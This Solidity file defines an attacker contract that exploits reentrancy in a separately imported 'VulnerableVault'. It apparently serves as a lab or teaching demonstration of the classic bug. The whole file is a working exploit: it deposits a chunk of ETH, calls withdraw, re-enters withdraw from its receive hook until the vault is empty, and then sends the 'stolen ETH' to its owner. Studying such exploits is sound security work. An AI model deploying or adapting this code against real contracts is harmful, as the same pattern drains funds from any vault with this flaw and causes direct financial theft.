// SPDX-License-Identifier: MIT
pragma solidity ^0.8.33;

import "./vulnerable.sol";

contract Attacker {
    VulnerableVault public vault;
    address public owner;
    uint256 public chunkSize;

    constructor(address _vault) {
        vault = VulnerableVault(payable(_vault));
        owner = msg.sender;
    }

    // let's get the attack started. Send exactly `_chunkSize` ETH.
    function attack(uint256 _chunkSize) external payable {
        require(msg.value == _chunkSize, "Send exactly chunkSize ETH");
        chunkSize = _chunkSize;
        vault.deposit{value: msg.value}();
        vault.withdraw(chunkSize);
    }

    // Re-entry hook — keep draining while vault has funds.
    receive() external payable {
        if (address(vault).balance >= chunkSize) {
            vault.withdraw(chunkSize);
        }
    }

    // attacker withdraws all stolen ETH.
    function drain() external {
        require(msg.sender == owner, "Not owner");
        (bool ok, ) = owner.call{value: address(this).balance}("");
        require(ok, "Transfer failed");
    }
}
